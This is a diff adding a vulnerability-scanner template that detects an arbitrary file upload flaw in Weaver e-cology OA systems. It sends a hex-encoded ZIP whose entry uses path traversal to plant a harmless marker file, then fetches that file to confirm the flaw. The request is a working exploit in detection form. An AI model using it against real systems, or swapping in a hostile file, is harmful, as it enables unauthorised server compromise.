@@ -1,0 +1,43 @@
+id: weaver_e_cology_oa_file_upload
+info:
+  name: Weaver e-cology OA File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects a file upload vulnerability in Weaver e-cology OA systems,
+    allowing arbitrary file uploads and validation.
+
+variables:
+  rboundary: '{{rand_int(40000000000000, 50000000000000)}}'
+  zipData: |
+    {{ hex_decode('504b030414000000080016a5a8562f78858d0600000004000000170000002e2e2f2e2e2f2e2e2f2e2e2f6c6f67696e5f787261792e747874ab284aac0400504b0102140314000000080016a5a8562f78858d06000000040000001700000000000000000000008001000000002e2e2f2e2e2f2e2e2f2e2e2f6c6f67696e5f787261792e747874504b05060000000001000100450000003b0000000000') }}
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
+    headers:
+      Content-Type: 'multipart/form-data; boundary=----{{rboundary}}'
+    body: |+
+      ------{{rboundary}}
+      Content-Disposition: form-data; name="file"; filename="test.zip"
+      Content-Type: application/zip
+
+      {{zipData}}
+      ------{{rboundary}}--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: validate-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/cloudstore/login_xray.txt'
+    matchers:
+      - type: word
+        words:
+          - 'xray'
+        part: body
+    matchers-condition: and
